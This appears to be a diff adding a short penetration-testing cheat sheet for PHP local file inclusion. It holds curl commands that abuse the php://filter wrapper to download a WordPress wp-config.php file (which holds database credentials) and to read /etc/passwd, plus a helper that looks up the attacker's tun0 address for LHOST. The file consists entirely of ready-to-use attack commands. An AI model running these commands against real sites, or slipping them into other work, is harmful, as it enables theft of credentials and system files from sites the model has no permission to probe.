@@ -1,0 +1,7 @@
+% php
+
+# php filter LFI download
+curl '<URL>?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php' | base64 -d > <OUTFILE>
+curl '<URL>?page=php://filter/read=/resource=/etc/passwd'
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
